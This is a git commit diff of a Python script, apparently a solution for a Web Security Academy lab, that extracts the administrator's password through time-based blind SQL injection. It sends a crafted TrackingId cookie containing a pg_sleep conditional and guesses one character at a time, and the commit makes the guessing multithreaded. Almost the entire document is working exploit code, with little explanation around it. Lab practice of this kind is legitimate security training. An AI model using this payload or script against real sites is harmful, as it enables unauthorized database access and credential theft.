d76496addd4b64b17d275b944ab68706a797373f
Duc <ltduc147@gmail.com>
2024-03-14 23:44:50 +0700

    Adjust source

--- WEB_02/sqli_3.py
+++ WEB_02/sqli_3.py
@@ -9,15 +9,22 @@ start_time = time.time()
 # URL LAB ID
 url = 'https://0a6b003203197b8782bbac52007b00e1.web-security-academy.net'
 
-admin_pass = ''
+threads = []
+admin_pass = [''] * 20
 
-for i in range(20):
+def find_character(i):
     for ascii_value in range(32,127):
         response = requests.get(url, cookies={"TrackingId" : f"' || (select case when (ascii(substr(password, {i+1}, 1)) = {ascii_value}) then pg_sleep(10) else NULL end from users where username='administrator' ) -- "})
         if response.elapsed.total_seconds() >= 10:
-            admin_pass  += chr(ascii_value)
-            print(admin_pass)
-            break
+            admin_pass[i] = chr(ascii_value)
+            return
 
-print(f"Administrator password: {admin_pass}")
+for i in range(20):
+    threads.append(Thread(target=find_character, args=(i,)))
+    threads[i].start()
+
+for i in range(20):
+    threads[i].join()
+
+print(f"Administrator password: {''.join(admin_pass)}")
 print('------------------------------------------- \nExecution Time: %s seconds' % (time.time() - start_time))
